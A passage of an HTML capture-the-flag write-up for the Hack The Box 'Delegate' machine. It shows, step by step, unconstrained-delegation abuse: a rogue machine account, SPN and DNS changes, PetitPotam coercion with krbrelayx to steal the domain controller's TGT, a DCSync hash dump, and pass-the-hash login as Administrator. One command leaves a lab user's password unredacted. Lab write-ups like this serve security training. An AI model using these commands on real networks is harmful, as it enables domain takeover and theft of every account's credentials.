+<h2 id="privilege-escalation-unconstrained-delegation-petitpotam">Privilege Escalation — Unconstrained Delegation + PetitPotam</h2>
+<h3 id="step-1-create-a-machine-account-and-enable-unconstrained-delegation">Step 1 — Create a machine account and enable Unconstrained Delegation</h3>
+<pre><code class="language-bash">addcomputer.py delegate.vl/N.Thompson:'&lt;REDACTED&gt;' -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' -dc-ip 10.129.234.69
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Successfully added machine account EVILPC$ with password EvilPass123!.
+</code></pre>
+<pre><code class="language-bash">bloodyAD -d delegate.vl -u 'N.Thompson' -p '&lt;REDACTED&gt;' -H 10.129.234.69 set object 'EVILPC$' userAccountControl -v 528384
+[+] EVILPC$'s userAccountControl has been updated
+</code></pre>
+<p>We verify the delegation flag was applied:</p>
+<pre><code class="language-bash">bloodyAD -d delegate.vl -u 'N.Thompson' -p '&lt;REDACTED&gt;' -H 10.129.234.69 get object 'EVILPC$' --attr userAccountControl
+
+distinguishedName: CN=EVILPC,CN=Computers,DC=delegate,DC=vl
+userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION
+</code></pre>
+<h3 id="step-2-add-spns-and-a-dns-record-for-evilpc">Step 2 — Add SPNs and a DNS record for EVILPC</h3>
+<p>For <code>krbrelayx</code> to decrypt the incoming Kerberos tickets, the DC must authenticate using Kerberos (not NTLM). This only happens if it can resolve <code>EVILPC.delegate.vl</code> to our IP and find a matching SPN.</p>
+<pre><code class="language-bash">python3 addspn.py -u 'delegate.vl\N.Thompson' -p '&lt;REDACTED&gt;' -s 'HOST/EVILPC.delegate.vl' -t 'EVILPC$' --additional ldap://10.129.234.69
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+</code></pre>
+<pre><code class="language-bash">python3 dnstool.py -u 'delegate.vl\N.Thompson' -p '&lt;REDACTED&gt;' -r 'EVILPC' -a add -d &lt;ATTACKER_IP&gt; -dc-ip 10.129.234.69 10.129.234.69
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+</code></pre>
+<pre><code class="language-bash">python3 addspn.py -u 'delegate.vl\N.Thompson' -p '&lt;REDACTED&gt;' -s 'HOST/EVILPC.delegate.vl' -t 'EVILPC$' ldap://10.129.234.69
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+</code></pre>
+<h3 id="step-3-capture-the-tgt-with-krbrelayx-petitpotam">Step 3 — Capture the TGT with krbrelayx + PetitPotam</h3>
+<p><strong>Terminal 1</strong> — Start <code>krbrelayx</code> in Unconstrained Delegation mode. The <code>--krbsalt</code> and <code>--krbpass</code> values are used to decrypt incoming tickets encrypted with <code>EVILPC$</code>'s key:</p>
+<pre><code class="language-bash">sudo python3 krbrelayx.py --krbsalt 'DELEGATE.VLEVILPC$' --krbpass 'EvilPass123!' \
+  --interface-ip &lt;ATTACKER_IP&gt;
+[*] Protocol Client SMB loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+[*] Servers started, waiting for connections
+</code></pre>
+<p><strong>Terminal 2</strong> — Use <code>PetitPotam</code> to coerce <code>DC1</code> into authenticating to <code>EVILPC.delegate.vl</code>. PetitPotam abuses the MS-EFSRPC protocol to force a machine to send its credentials to an attacker-controlled server:</p>
+<pre><code class="language-bash">python3 PetitPotam.py -u 'N.Thompson' -p 'KALEB_2341' -d delegate.vl \
+  EVILPC.delegate.vl DC1.delegate.vl
+/home/n0name/Documents/HTBLabs/Machines/Medium/Delegate/PetitPotam.py:23: SyntaxWarning: &quot;\ &quot; is an invalid escape sequence. Such sequences will not work in the future. Did you mean &quot;\\ &quot;? A raw string is also an option.
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+
+
+              ___            _        _      _        ___            _
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
+          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|
+          &quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'&quot;`-0-0-'
+
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+
+                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:DC1.delegate.vl[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+</code></pre>
+<p>Back in Terminal 1:</p>
+<pre><code class="language-bash">[*] Setting up DNS Server
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.234.69
+[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
+[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+[*] SMBD: Received connection from 10.129.234.69
+[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
+[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+</code></pre>
+<p>The DC authenticated to our fake server using Kerberos. Because <code>EVILPC$</code> has Unconstrained Delegation enabled, the DC's TGT was embedded in the service ticket and <code>krbrelayx</code> extracted and saved it to disk.</p>
+<h3 id="step-4-dcsync-with-dc1s-tgt">Step 4 — DCSync with DC1$'s TGT</h3>
+<pre><code class="language-bash">export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'
+secretsdump.py -k -no-pass DC1.delegate.vl -just-dc-ntlm
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:&lt;REDACTED_HASH&gt;
+krbtgt:502:&lt;REDACTED_HASH&gt;
+A.Briggs:1104:&lt;REDACTED_HASH&gt;
+N.Thompson:1108:&lt;REDACTED_HASH&gt;
+DC1$:1000:&lt;REDACTED_HASH&gt;
+&lt;SNIP&gt;
+</code></pre>
+<p>All domain hashes dumped.</p>
+<hr />
+<h2 id="shell-as-administrator-root-flag">Shell as Administrator — Root Flag</h2>
+<pre><code class="language-bash">evil-winrm -i 10.129.234.69 -u Administrator -H &lt;REDACTED_HASH&gt;
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+&lt;ROOT_FLAG&gt;
+</code></pre>
+<p>Rooted!</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": [], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
